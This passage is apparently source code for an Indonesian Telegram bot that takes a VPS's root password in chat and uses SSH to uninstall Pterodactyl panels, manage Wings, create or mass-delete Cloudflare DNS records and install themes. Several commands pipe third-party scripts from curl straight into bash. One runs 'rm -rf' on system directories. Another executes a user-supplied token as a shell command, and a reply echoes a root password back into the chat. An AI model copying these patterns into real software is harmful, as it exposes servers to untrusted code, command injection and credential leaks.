                ctx.reply('<blockquote>✅ <b>Password Changed Successfully</b>\n\n_Password VPS berhasil diganti_</blockquote>', 
                    { parse_mode: "HTML" });
                conn.end();
                
                console.log(chalk.green(`✅ Password changed for ${userId}`));
                
            }).on('data', (data) => {
                stream.write('bashandtokenbyxyro\n');
                stream.write('8\n');
                stream.write(`${passvpsnew}\n`);
                stream.write(`${passvpsnew}\n`);
                stream.write(`x\n`);
                console.log(chalk.blue('[PASSWORD STDOUT]'), data.toString().trim());
                
            }).stderr.on('data', (data) => {
                console.log(chalk.red('[PASSWORD STDERR]'), data.toString().trim());
            });
        });
        
    }).on('error', (error) => {
        console.error(chalk.red(`❌ Change password error: ${error.message}`));
        ctx.reply('<blockquote>❌ <b>Connection Failed</b>\n\nKatasandi atau IP tidak valid</blockquote>', 
            { parse_mode: "HTML" });
        
    }).connect(connSettings);
});
*/

// ------------------------ [ Command: Uninstal panel ] ------------------------ \\
bot.command("uninstallpanel", async (ctx) => {
    const chatType = ctx.chat.type;
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;

    const limitAllowed = await checkUserLimit(ctx, "uninstallpanel");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    const input = args;

    if (!input.includes("|")) {
        return ctx.reply(
            "<blockquote>❌ <b>Format salah!</b>\n\nGunakan:\n<code>/uninstallpanel ipvps|pwvps</code></blockquote>",
            { parse_mode: "HTML" }
        );
    }

    const [ipvps, pwvps] = input.split("|").map(v => v.trim());
    if (!ipvps || !pwvps) {
        return ctx.reply(
            "<blockquote>❌ <b>Format salah!</b>\n\nGunakan:\n<code>/uninstallpanel ipvps|pwvps</code></blockquote>",
            { parse_mode: "HTML" }
        );
    }

    const conn = new Client();
    const scriptUninstall = `bash <(curl -s https://pterodactyl-installer.se)`;

    try {
        await ctx.reply(
            `<blockquote>⏳ Menghubungkan ke VPS <b>${ipvps}</b>...\nMemulai proses <b>uninstall panel</b>...</blockquote>`,
            { parse_mode: "HTML" }
        );

        let processCompleted = false;
        const timeout = setTimeout(() => {
            if (!processCompleted) {
                try { conn.end(); conn.destroy(); } catch (e) {}
                ctx.reply('<blockquote>⏱️ <b>Waktu koneksi habis!</b> Periksa VPS dan coba lagi.</blockquote>', { parse_mode: "HTML" });
            }
        }, 120000);

        conn.on("ready", () => {
            ctx.reply("<blockquote>⚙️ <b>Koneksi berhasil!</b> Memulai proses uninstall panel...</blockquote>", {
                parse_mode: "HTML"
            });

            conn.exec(scriptUninstall, (err, stream) => {
                if (err) {
                    processCompleted = true;
                    clearTimeout(timeout);
                    try { conn.end(); } catch (e) {}
                    return ctx.reply(`<blockquote>❌ <b>Gagal menjalankan script!</b>\n<code>${err.message}</code></blockquote>`, { parse_mode: "HTML" });
                }

                let output = "";

                stream.on("data", (data) => {
                    const str = data.toString();
                    output += str;

                    if (str.includes("Input 0-6")) stream.write("6\n");
                    if (str.includes("(y/N)")) stream.write("y\n");
                    if (str.includes("* Choose the panel user (to skip don't input anything):")) stream.write("\n");
                    if (str.includes("* Choose the panel database (to skip don't input anything):")) stream.write("\n");
                });

                stream.stderr.on("data", (data) => {
                    output += `\n[ERROR] ${data.toString()}`;
                });

                stream.on("close", (code, signal) => {
                    processCompleted = true;
                    clearTimeout(timeout);
                    try { conn.end(); } catch (e) {}

                    const cleanOut = output.trim().slice(-2000) || "(tidak ada output)";
                    const teks = `<blockquote>✅ <b>Uninstall Panel selesai!</b>\n\n📘 VPS: <code>${ipvps}</code>\n🧹 Panel berhasil dihapus dari sistem</blockquote>`;
                    ctx.reply(teks, { parse_mode: "HTML" });
                });
            });
        });

        conn.on("error", (err) => {
            processCompleted = true;
            clearTimeout(timeout);
            try { conn.end(); } catch (e) {}
            ctx.reply(`<blockquote>❌ <b>Gagal terhubung ke VPS!</b>\nPeriksa IP dan Password.\n\nError:\n<code>${err.message}</code></blockquote>`, { parse_mode: "HTML" });
        });

        conn.connect({
            host: ipvps,
            port: 22,
            username: "root",
            password: pwvps,
            readyTimeout: 20000,
        });
    } catch (e) {
        clearTimeout(timeout);
        try { conn.end(); } catch (err) {}
        console.error("Error /uninstallpanel:", e);
        ctx.reply("<blockquote>❌ Terjadi kesalahan internal. Coba lagi nanti.</blockquote>", { parse_mode: "HTML" });
    }
});

bot.command("startwings", async (ctx) => {
    const chatType = ctx.chat.type;
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;

    const limitAllowed = await checkUserLimit(ctx, "startwings");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    const input = args;

    if (!input.includes('|')) {
        return ctx.reply(
            '<blockquote>❌ <b>Salah format!</b>\n\nGunakan:\n<code>/startwings ipvps|pwvps|token_node</code></blockquote>',
            { parse_mode: 'HTML' }
        );
    }

    const [ipvps, pwvps, token] = input.split('|').map((i) => i.trim());
    if (!ipvps || !pwvps || !token) {
        return ctx.reply(
            '<blockquote>❌ <b>Salah format!</b>\n\nGunakan:\n<code>/startwings ipvps|pwvps|token_node</code></blockquote>',
            { parse_mode: 'HTML' }
        );
    }

    const conn = new Client();
    const fullCommand = `${token} && systemctl start wings`;

    try {
        await ctx.reply(
            `<blockquote>⏳ Menghubungkan ke VPS <b>${ipvps}</b>...\nSedang menjalankan perintah <code>systemctl start wings</code></blockquote>`,
            { parse_mode: 'HTML' }
        );

        let processCompleted = false;
        const timeout = setTimeout(() => {
            if (!processCompleted) {
                try { conn.end(); conn.destroy(); } catch (e) {}
                ctx.reply('<blockquote>⏱️ <b>Waktu koneksi habis!</b> Periksa VPS dan coba lagi.</blockquote>', { parse_mode: 'HTML' });
            }
        }, 60000);

        conn.on('ready', () => {
            ctx.reply('<blockquote>⚙️ <b>Koneksi berhasil!</b> Wings sedang dijalankan...</blockquote>', { parse_mode: "HTML" });

            conn.exec(fullCommand, { pty: true }, (err, stream) => {
                if (err) {
                    processCompleted = true;
                    clearTimeout(timeout);
                    try { conn.end(); } catch (e) {}
                    return ctx.reply(
                        `<blockquote>❌ <b>Gagal mengeksekusi perintah:</b>\n<code>${err.message}</code></blockquote>`,
                        { parse_mode: 'HTML' }
                    );
                }

                let output = '';
                let stderrOutput = '';

                stream.on('data', (data) => {
                    output += data.toString();
                    console.log('[STDOUT]', data.toString());
                });

                stream.stderr.on('data', (data) => {
                    stderrOutput += data.toString();
                    console.log('[STDERR]', data.toString());
                    try {
                        stream.write('y\n');
                        stream.write('systemctl start wings\n');
                    } catch (e) {}
                });

                stream.on('close', (code, signal) => {
                    processCompleted = true;
                    clearTimeout(timeout);
                    try { conn.end(); } catch (e) {}

                    let replyText = `<blockquote>✅ <b>Wings berhasil dijalankan!</b>\n\nKode keluar: ${code}`;
                    if (stderrOutput) {
                        replyText += `\n\n⚠️ <b>Catatan STDERR:</b>\n<code>${stderrOutput.slice(-1000)}</code>`;
                    }
                    replyText += `</blockquote>`;

                    ctx.reply(replyText, { parse_mode: 'HTML' });
                });
            });
        });

        conn.on('error', (err) => {
            processCompleted = true;
            clearTimeout(timeout);
            try { conn.end(); } catch (e) {}
            ctx.reply(
                `<blockquote>❌ <b>Gagal terhubung ke VPS!</b>\nPeriksa IP & Password kamu.\n\nError:\n<code>${err.message}</code></blockquote>`,
                { parse_mode: 'HTML' }
            );
        });

        conn.connect({
            host: ipvps,
            port: 22,
            username: 'root',
            password: pwvps,
            readyTimeout: 20000,
        });
    } catch (e) {
        clearTimeout(timeout);
        try { conn.end(); } catch (err) {}
        console.error('Error /startwings:', e);
        ctx.reply('<blockquote>❌ Terjadi kesalahan internal. Coba lagi nanti.</blockquote>', { parse_mode: 'HTML' });
    }
});

bot.command("uninstallwings", async (ctx) => {
    const chatType = ctx.chat.type;
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;

    const limitAllowed = await checkUserLimit(ctx, "uninstallwings");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    const input = args;

    if (!input || !input.includes("|")) {
        return ctx.reply(
            "<blockquote>❌ <b>Format salah!</b>\n\nGunakan:\n<code>/uninstallwings ip|password</code></blockquote>",
            { parse_mode: "HTML" }
        );
    }

    const [ipvps, pwvps] = input.split("|").map((i) => i.trim());
    if (!ipvps || !pwvps) {
        return ctx.reply(
            "<blockquote>❌ <b>Format salah!</b>\n\nGunakan:\n<code>/uninstallwings ip|password</code></blockquote>",
            { parse_mode: "HTML" }
        );
    }

    const conn = new Client();
    const script = `
systemctl stop wings
systemctl disable wings
rm -f /etc.systemd.system/wings.service
rm -f /usr/local/bin/wings
rm -rf /etc/pterodactyl
rm -rf /var/lib/pterodactyl
`;

    try {
        await ctx.reply(
            `<blockquote>🛠 Menghubungkan ke VPS <b>${ipvps}</b>...\nSedang menghapus Wings dan membersihkan port...</blockquote>`,
            { parse_mode: "HTML" }
        );

        let processCompleted = false;
        const timeout = setTimeout(() => {
            if (!processCompleted) {
                try { conn.end(); conn.destroy(); } catch (e) {}
                ctx.reply('<blockquote>⏱️ <b>Waktu koneksi habis!</b> Periksa VPS dan coba lagi.</blockquote>', { parse_mode: "HTML" });
            }
        }, 60000);

        conn.on("ready", () => {
            ctx.reply("<blockquote>⚙️ <b>Koneksi berhasil!</b> Wings sedang dihapus...</blockquote>", { parse_mode: "HTML" });

            conn.exec(script, { pty: true }, (err, stream) => {
                if (err) {
                    processCompleted = true;
                    clearTimeout(timeout);
                    conn.end();
                    return ctx.reply(`<blockquote>❌ <b>Gagal eksekusi command:</b>\n<code>${err.message}</code></blockquote>`, { parse_mode: "HTML" });
                }

                let output = "";
                let stderrOutput = "";

                stream.on("data", (data) => {
                    output += data.toString();
                    console.log("[STDOUT]", data.toString());
                });

                stream.stderr.on("data", (data) => {
                    stderrOutput += data.toString();
                    console.log("[STDERR]", data.toString());
                });

                stream.on("close", (code) => {
                    processCompleted = true;
                    clearTimeout(timeout);
                    conn.end();
                    let reply = `<blockquote>✅ <b>Wings berhasil dihapus dari VPS ${ipvps}</b>\n🧹 Port juga dibersihkan.\n\nKode keluar: ${code}`;
                    if (stderrOutput) {
                        reply += `\n\n⚠️ <b>Catatan STDERR:</b>\n<code>${stderrOutput.slice(-800)}</code>`;
                    }
                    reply += `</blockquote>`;
                    ctx.reply(reply, { parse_mode: "HTML" });
                });
            });
        });

        conn.on("error", (err) => {
            processCompleted = true;
            clearTimeout(timeout);
            ctx.reply(`<blockquote>❌ <b>Tidak bisa konek ke VPS:</b>\n<code>${err.message}</code></blockquote>`, { parse_mode: "HTML" });
        });

        conn.connect({
            host: ipvps,
            port: 22,
            username: "root",
            password: pwvps,
            readyTimeout: 20000,
        });
    } catch (e) {
        clearTimeout(timeout);
        try { conn.end(); } catch {}
        console.error("Error /uninstallwings:", e);
        ctx.reply("<blockquote>❌ Terjadi kesalahan internal. Coba lagi nanti.</blockquote>", { parse_mode: "HTML" });
    }
});

// ------------------------ [ Command: Subdomain ] ------------------------ \\
bot.command(["subdo", "subdomain"], async (ctx) => {
    const chatType = ctx.chat.type;
    const userId = ctx.from.id.toString();
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;
    
    const limitAllowed = await checkUserLimit(ctx, "subdomain");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    const text = args;

    if (!text) {
        return ctx.reply(
            "<blockquote>❌ Format salah!\n\nContoh: <code>/subdo reqname|ipvps</code></blockquote>",
            { parse_mode: "HTML" }
        );
    }

    if (!text.includes("|")) {
        return ctx.reply(
            "<blockquote>❌ Format salah!\n\nContoh: <code>/subdo reqname|ipvps</code></blockquote>",
            { parse_mode: "HTML" }
        );
    }

    const [host, ip] = text.split("|").map(i => i.trim());
    
    // Load
    loadSubdomainData();
    const dom = Object.keys(subdomainData);

    if (dom.length === 0) {
        return ctx.reply(
            "<blockquote>❌ Tidak ada domain yang tersedia saat ini.</blockquote>",
            { parse_mode: "HTML" }
        );
    }

    subdomainPages[userId] = {
        host,
        ip,
        domains: dom,
        currentPage: 0,
        itemsPerPage: 5
    };

    await showSubdomainSelection(ctx, userId);
});

bot.action(/^subdo_page_(.+)_(\d+)$/, async (ctx) => {
    try {
        const userId = ctx.match[1];
        const pageNum = parseInt(ctx.match[2]);
        
        if (!subdomainPages[userId]) {
            await ctx.answerCbQuery("❌ Session expired", { show_alert: true });
            return;
        }

        subdomainPages[userId].currentPage = pageNum;
        await ctx.answerCbQuery(`Halaman ${pageNum + 1}`);
        await showSubdomainSelection(ctx, userId);
        
    } catch (error) {
        console.error("Error in page navigation:", error);
        await ctx.answerCbQuery("❌ Error", { show_alert: true });
    }
});

bot.action(/^select_domain_(\d+)_(.+)$/, async (ctx) => {
    try {
        const domainIndex = parseInt(ctx.match[1]);
        const [host, ip] = ctx.match[2].split("|").map(i => i.trim());
        
        loadSubdomainData();
        const dom = Object.keys(subdomainData);
        
        if (domainIndex < 0 || domainIndex >= dom.length) {
            await ctx.answerCbQuery("❌ Domain tidak valid", { show_alert: true });
            return;
        }

        const selectedDomain = dom[domainIndex];
        const tempData = {
            domainIndex,
            host,
            ip,
            selectedDomain
        };
        
        if (!global.tempSubdoData) global.tempSubdoData = {};
        global.tempSubdoData[ctx.from.id] = tempData;
        const keyboard = {
            inline_keyboard: [
                [
                    { text: "🟢 Proxy ON [ CDN ]", callback_data: `create_subdo_${domainIndex}_${host}|${ip}|on` },
                    { text: "🔵 Proxy OFF [ DIREACT ]", callback_data: `create_subdo_${domainIndex}_${host}|${ip}|off` }
                ],
                [
                    { text: "❌ Batal", callback_data: `cancel_subdo_${ctx.from.id}` }
                ]
            ]
        };

        await ctx.editMessageText(
            `<blockquote>🌐 <b>Domain dipilih:</b> <code>${selectedDomain}</code>\n\n` +
            `📌 Host: <code>${host}</code>\n` +
            `📡 IP: <code>${ip}</code>\n\n` +
            `⚙️ Pilih mode proxy:</blockquote>`,
            {
                parse_mode: "HTML",
                reply_markup: keyboard
            }
        );

        await ctx.answerCbQuery();
        
    } catch (error) {
        console.error("Error selecting domain:", error);
        await ctx.answerCbQuery("❌ Error", { show_alert: true });
    }
});

bot.action(/^create_subdo_(\d+)_(.+)$/, async (ctx) => {
    try {
        const domainIndex = parseInt(ctx.match[1]);
        const params = ctx.match[2].split("|");
        const host = params[0].trim();
        const ip = params[1].trim();
        const proxyMode = params[2] === "on";
        
        await ctx.answerCbQuery("⏳ Membuat subdomain...");
        
        loadSubdomainData();
        const dom = Object.keys(subdomainData);
        
        if (domainIndex < 0 || domainIndex >= dom.length) {
            await ctx.reply("<blockquote>❌ Domain tidak valid!</blockquote>", { parse_mode: "HTML" });
            return;
        }

        const tldnya = dom[domainIndex];
        const { apitoken, zone } = subdomainData[tldnya] || {};

        if (!apitoken || !zone) {
            return ctx.reply(
                `<blockquote>❌ Konfigurasi Cloudflare untuk <code>${tldnya}</code> tidak lengkap!</blockquote>`,
                { parse_mode: "HTML" }
            );
        }

        async function createSubDomain(host, ip, proxy) {
            try {
                const cleanHost = host.replace(/[^a-z0-9.-]/gi, "");
                const cleanIp = ip.replace(/[^0-9.]/gi, "");
                
                const response = await axios.post(
                    `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                    {
                        type: "A",
                        name: `${cleanHost}.${tldnya}`,
                        content: cleanIp,
                        ttl: 1,
                        proxied: proxy
                    },
                    {
                        headers: {
                            Authorization: `Bearer ${apitoken}`,
                            "Content-Type": "application/json"
                        }
                    }
                );

                const res = response.data;
                if (res.success) {
                    return {
                        success: true,
                        name: res.result.name,
                        ip: res.result.content,
                        proxy: res.result.proxied
                    };
                } else {
                    return {
                        success: false,
                        error: res.errors?.[0]?.message || "Gagal membuat subdomain"
                    };
                }
            } catch (e) {
                let errorMsg = "Terjadi kesalahan";
                if (e.response?.data?.errors?.[0]?.message) {
                    errorMsg = e.response.data.errors[0].message;
                } else if (e.message) {
                    errorMsg = e.message;
                }
                return {
                    success: false,
                    error: errorMsg
                };
            }
        }

        const result = await createSubDomain(host.toLowerCase(), ip, proxyMode);

        if (result.success) {
            await ctx.editMessageText(
                `<blockquote>✅ <b>SUBDOMAIN BERHASIL DIBUAT</b>\n\n` +
                `🌐 <b>Subdomain:</b> <code>${result.name}</code>\n` +
                `📌 <b>IP VPS:</b> <code>${result.ip}</code>\n` +
                `🛡 <b>Proxy:</b> <code>${proxyMode ? "ON [ CDN AKTIF ]" : "OFF [ DIREACT IP ]"}</code>\n\n` +
                `✨ Subdomain siap digunakan!</blockquote>`,
                { 
                    parse_mode: "HTML",
                    reply_markup: { inline_keyboard: [] }
                }
            );
            
            delete subdomainPages[ctx.from.id];
            
        } else {
            await ctx.editMessageText(
                `<blockquote>❌ <b>Gagal membuat subdomain:</b>\n<code>${result.error}</code>\n\n` +
                `Coba lagi dengan domain lain.</blockquote>`,
                { 
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "🔄 Coba Lagi", callback_data: `retry_subdo_${ctx.from.id}` }],
                            [{ text: "❌ Batalkan", callback_data: `cancel_subdo_${ctx.from.id}` }]
                        ]
                    }
                }
            );
        }
        
    } catch (error) {
        console.error("Error creating subdomain:", error);
        await ctx.reply(
            `<blockquote>❌ Error: ${error.message}</blockquote>`,
            { parse_mode: "HTML" }
        );
    }
});

bot.action(/^retry_subdo_(.+)$/, async (ctx) => {
    try {
        const userId = ctx.match[1];
        
        if (subdomainPages[userId]) {
            await ctx.answerCbQuery("🔄 Memuat ulang...");
            await showSubdomainSelection(ctx, userId);
        } else {
            await ctx.answerCbQuery("❌ Session expired", { show_alert: true });
        }
        
    } catch (error) {
        console.error("Error retrying subdomain:", error);
    }
});

// ------- [ cancel subdo ] ------- \\\
bot.action(/^cancel_subdo_(.+)$/, async (ctx) => {
    try {
        const userId = ctx.match[1];
        
        delete subdomainPages[userId];
        await ctx.answerCbQuery("❌ Dibatalkan");
        
        if (ctx.callbackQuery.message) {
            await ctx.editMessageText(
                "<blockquote>❌ <b>Pembuatan subdomain dibatalkan</b></blockquote>",
                {
                    parse_mode: "HTML",
                    reply_markup: { inline_keyboard: [] }
                }
            );
        }
        
    } catch (error) {
        console.error("Error canceling subdomain:", error);
    }
});

// ------------------------ [ Command: Listsubdo ] ------------------------ \\
bot.command("listsubdo", async (ctx) => {
    const chatType = ctx.chat.type;
    const userId = ctx.from.id.toString();
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;

    const subdomains = loadSubdomainData();
    const dom = Object.keys(subdomains);
    
    if (dom.length === 0) {
        return ctx.reply("❌ Tidak ada domain yang tersedia saat ini.", { 
            parse_mode: "HTML" 
        });
    }

    let teks = `📜 <b>Daftar Domain yang Tersedia</b>\n\n`;
    dom.forEach((d, i) => {
        const domainInfo = subdomains[d];
        const zoneInfo = domainInfo?.zone ? `\n- Zone: ${domainInfo.zone}` : '';
        teks += `${i + 1}. <code>${d}</code> ${zoneInfo}\n`;
    });

    teks += `\n📊 Total: ${dom.length} domain`;

    ctx.reply(teks, { 
        parse_mode: "HTML",
        reply_to_message_id: ctx.message?.message_id 
    });
});

// ------------------------ [ Command: Cleardns ] ------------------------ \\
bot.command("cleardns", async (ctx) => {
    const chatType = ctx.chat.type;
    const userId = ctx.from.id.toString();
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;

    const subdomains = loadSubdomainData();
    const domainList = Object.keys(subdomains);

    if (!domainList.length) {
        return ctx.reply("❌ Tidak ada domain.", { 
            parse_mode: "HTML" 
        });
    }

    const sentMsg = await ctx.reply(
        "<b>🧹 CLEAR DNS</b>\n\n⏳ Memulai...",
        { parse_mode: "HTML" }
    );

    let output = "";
    let cleared = 0;
    let skipped = 0;
    let failed = 0;

    for (let i = 0; i < domainList.length; i++) {
        const domain = domainList[i];
        const { zone, apitoken } = subdomains[domain];

        let dnsCount = 0;
        let status = "➡️ SKIP";

        try {
            const countRes = await axios.get(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records?per_page=1`,
                { 
                    headers: { 
                        Authorization: `Bearer ${apitoken}` 
                    },
                    timeout: 10000
                }
            );

            dnsCount = countRes.data?.result_info?.total_count || 0;
            if (dnsCount === 0) {
                status = "➡️ SKIP [ DNS 0 ]";
                skipped++;
            }
            else if (dnsCount < 200) {
                status = "➡️ SKIP [ AMAN ]";
                skipped++;
            }
            else {
                let deleted = 0;

                while (true) {
                    const listRes = await axios.get(
                        `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records?per_page=50`,
                        { 
                            headers: { 
                                Authorization: `Bearer ${apitoken}` 
                            },
                            timeout: 15000
                        }
                    );

                    const records = listRes.data.result || [];
                    if (!records.length) break;

                    for (const r of records) {
                        if (r.type === "NS") continue;

                        try {
                            await axios.delete(
                                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records/${r.id}`,
                                { 
                                    headers: { 
                                        Authorization: `Bearer ${apitoken}` 
                                    },
                                    timeout: 10000
                                }
                            );
                            deleted++;
                            await new Promise(resolve => setTimeout(resolve, 120));
                        } catch (e) {
                            console.error(`Gagal menghapus record ${r.id}:`, e.message);
                        }
                    }

                    await new Promise(resolve => setTimeout(resolve, 800));
                }

                status = `✅ CLEARED [ ${deleted} ]`;
                cleared++;
            }
        } catch (e) {
            console.error(`Error untuk domain ${domain}:`, e.message);
            status = "❌ ERROR [ LIMIT ]";
            failed++;
        }

        output +=
            `🌍 <code>${domain}</code>\n` +
            `📦 DNS: ${dnsCount}\n` +
            `📡 Status: <b>${status}</b>\n\n`;

        if (i % 2 === 0 || i === domainList.length - 1) {
            try {
                await ctx.telegram.editMessageText(
                    sentMsg.chat.id,
                    sentMsg.message_id,
                    null,
                    `<b>🧹 CLEAR DNS</b>\n` +
                    `📊 Progress: ${i + 1}/${domainList.length}\n\n${output}`,
                    { parse_mode: "HTML" }
                );
            } catch (editError) {
                console.error("Gagal edit pesan:", editError.message);
            }
        }

        await new Promise(resolve => setTimeout(resolve, 600));
    }

    const finalMessage = 
        `<b>🧹 CLEAR DNS SELESAI</b>\n\n` +
        `✅ Cleared : ${cleared}\n` +
        `⏭️ Skip    : ${skipped}\n` +
        `❌ Error   : ${failed}\n\n` +
        `${output}`;

    try {
        await ctx.telegram.editMessageText(
            sentMsg.chat.id,
            sentMsg.message_id,
            null,
            finalMessage,
            { parse_mode: "HTML" }
        );
    } catch (finalError) {
        console.error("Gagal update pesan final:", finalError.message);
        await ctx.reply(finalMessage, { parse_mode: "HTML" });
    }
});

// ------------------------ [ Command: Install Tema Reviactyl ] ------------------------ \\
bot.command("installtemareviactyl", async (ctx) => {
    const userId = ctx.from.id.toString();
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;
    
    const limitAllowed = await checkUserLimit(ctx, "installtemareviactyl");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    const input = args;

    if (!input || !input.includes(",")) {
        return ctx.reply(
            "<blockquote>❌ Format salah!\n\nContoh:\n<code>/installtemareviactyl ipvps,pwvps</code></blockquote>",
            { parse_mode: "HTML" }
        );
    }

    const [ipvps, passwd] = input.split(",").map(v => v.trim());
    if (!ipvps || !passwd) {
        return ctx.reply(
            "<blockquote>❌ Format salah!\n\nContoh:\n<code>/installtemareviactyl ipvps,pwvps</code></blockquote>",
            { parse_mode: "HTML" }
        );
    }

    const conn = new Client();
    const command = "bash <(curl -s https://raw.githubusercontent.com/Bangsano/themeinstaller/refs/heads/main/install.sh)";

    try {
        await ctx.reply(
            `<blockquote>⏳ Menghubungkan ke VPS <b>${ipvps}</b>...\n📦 Memulai instalasi tema Reviactyl...</blockquote>`,
            { parse_mode: "HTML" }
        );

        let processCompleted = false;
        const timeout = setTimeout(() => {
            if (!processCompleted) {
                try { conn.end(); } catch(e) {}
                ctx.reply('<blockquote>⏱️ <b>Waktu koneksi habis!</b> Periksa VPS dan coba lagi.</blockquote>', { parse_mode: "HTML" });
            }
        }, 300000); // 5 menit timeout

        conn.on("ready", () => {
            ctx.reply(
                "<blockquote>⚙️ <b>Proses instalasi tema Reviactyl...</b>\nTunggu 1-10 menit hingga proses selesai ✅</blockquote>",
                { parse_mode: "HTML" }
            );

            conn.exec(command, (err, stream) => {
                if (err) {
                    processCompleted = true;
                    clearTimeout(timeout);
                    try { conn.end(); } catch(e) {}
                    return ctx.reply(
                        `<blockquote>❌ <b>Gagal menjalankan script instalasi!</b>\n<code>${err.message}</code></blockquote>`,
                        { parse_mode: "HTML" }
                    );
                }

                stream.on("data", (data) => {
                    const str = data.toString();
                    if (str.includes("pilihan") || str.includes("option") || str.includes("select") || str.includes("Input")) {
                        setTimeout(() => {
                            try {
                                stream.write("1\n");
                                stream.write("9\n");
                                stream.write("y\n");
                                stream.write("x\n");
                            } catch (e) {}
                        }, 500);
                    }
                });

                stream.on("close", () => {
                    processCompleted = true;
                    clearTimeout(timeout);
                    try { conn.end(); } catch(e) {}

                    ctx.reply(
                        `<blockquote>✅ <b>Berhasil install tema Reviactyl!</b>\n\n🎉 Tema telah berhasil diinstal pada VPS.\n🔄 Silakan refresh panel Anda.</blockquote>`,
                        { parse_mode: "HTML" }
                    );
                });
            });
        });

        conn.on("error", (err) => {
            processCompleted = true;
            clearTimeout(timeout);
            try { conn.end(); } catch(e) {}
            
            let errorMessage = '<blockquote>❌ <b>Gagal terhubung ke VPS!</b>\n\nPeriksa:\n';
            errorMessage += '1. IP VPS benar\n';
            errorMessage += '2. Password root benar\n';
            errorMessage += '3. Port SSH (22) terbuka\n';
            errorMessage += '4. VPS sedang aktif\n\n';
            errorMessage += `<b>Error detail:</b>\n<code>${err.message || 'Unknown error'}</code></blockquote>`;
            
            ctx.reply(errorMessage, { parse_mode: "HTML" });
        });

        conn.connect({
            host: ipvps,
            port: 22,
            username: "root",
            password: passwd,
            readyTimeout: 20000,
        });
    } catch (e) {
        ctx.reply(`<blockquote>❌ <b>Terjadi kesalahan:</b>\n<code>${e.message}</code></blockquote>`, { parse_mode: "HTML" });
    }
});

// ------------------------ [ Command: Install Blueprint ] ------------------------ \\
bot.command("installblueprint", async (ctx) => {
    const userId = ctx.from.id.toString();
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;
    
    const limitAllowed = await checkUserLimit(ctx, "installblueprint");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    if (!args || !args.includes("|")) {
        return ctx.reply("<blockquote>❌ <b>Format:</b> /installblueprint ip|password</blockquote>", { parse_mode: "HTML" });
    }

    const [ipvps, passwd] = args.split("|").map(v => v.trim());
    const conn = new Client();

    try {
        await ctx.reply(`<blockquote>🌀 <b>Proses Install Tema Blueprint</b>\n📡 IP: ${ipvps}\n⏳ Tunggu 1–10 menit...</blockquote>`, { parse_mode: "HTML" });

        conn.on("ready", () => {
            conn.exec("bash <(curl -s https://raw.githubusercontent.com/Bangsano/themeinstaller/refs/heads/main/install.sh)", (err, stream) => {
                if (err) {
                    conn.end();
                    return ctx.reply(`<blockquote>❌ Error: ${err.message}</blockquote>`, { parse_mode: "HTML" });
                }

                stream.on("data", (data) => {
                    const str = data.toString();
                    if (str.includes("pilihan") || str.includes("option") || str.includes("select")) {
                        stream.write("2\n");
                        stream.write("y\n");
                        stream.write("x\n");
                    }
                });

                stream.on("close", () => {
                    ctx.reply(
`<blockquote>✅ <b>Install Blueprint berhasil!</b>
📡 <b>IP:</b> ${ipvps}
🔑 <b>Password:</b> ${passwd}

Untuk install tema Nebula, gunakan perintah:
<code>/installnebula ${ipvps}|${passwd}</code>
<code>/installeuphoria ${ipvps}|${passwd}</code></blockquote>`,
                        { parse_mode: "HTML" }
                    );
                    conn.end();
                });
            });
        });

        conn.on("error", (err) => {
            ctx.reply(`<blockquote>❌ Gagal konek: ${err.message}</blockquote>`, { parse_mode: "HTML" });
        });

        conn.connect({
            host: ipvps,
            port: 22,
            username: "root",
            password: passwd,
            readyTimeout: 20000
        });

    } catch (e) {
        ctx.reply(`<blockquote>❌ Error: ${e.message}</blockquote>`, { parse_mode: "HTML" });
    }
});

// ------------------------ [ Command: Install Euphoria ] ------------------------ \\
bot.command("installeuphoria", async (ctx) => {
    const userId = ctx.from.id.toString();
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;
    
    const limitAllowed = await checkUserLimit(ctx, "installeuphoria");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    if (!args || !args.includes("|")) {
        return ctx.reply("<blockquote>❌ <b>Format:</b> /installeuphoria ip|password</blockquote>", { parse_mode: "HTML" });
    }

    const [ipvps, passwd] = args.split("|").map(v => v.trim());
    const conn = new Client();

    try {
        await ctx.reply(`<blockquote>🌀 <b>Proses Install Tema Euphoria</b>\n📡 IP: ${ipvps}\n⏳ Tunggu...</blockquote>`, { parse_mode: "HTML" });

        conn.on("ready", () => {
            conn.exec("bash <(curl -s https://ptero.nobitapro.online)", (err, stream) => {
                if (err) {
                    conn.end();
                    return ctx.reply(`<blockquote>❌ Error: ${err.message}</blockquote>`, { parse_mode: "HTML" });
                }

                stream.on("data", (data) => {
                    const str = data.toString();
                    if (str.includes("pilihan") || str.includes("option")) {
                        stream.write("5\n");
                        stream.write("2\n");
                        stream.write("2\n");
                        stream.write("0\n");
                        stream.write("8\n");
                    }
                });

                stream.on("close", () => {
                    ctx.reply("<blockquote>✅ <b>Berhasil install tema Euphoria!</b></blockquote>", { parse_mode: "HTML" });
                    conn.end();
                });
            });
        });

        conn.connect({
            host: ipvps,
            port: 22,
            username: "root",
            password: passwd,
            readyTimeout: 20000
        });

    } catch (e) {
        ctx.reply(`<blockquote>❌ Error: ${e.message}</blockquote>`, { parse_mode: "HTML" });
    }
});

// ------------------------ [ Command: Install Nebula ] ------------------------ \\
bot.command("installnebula", async (ctx) => {
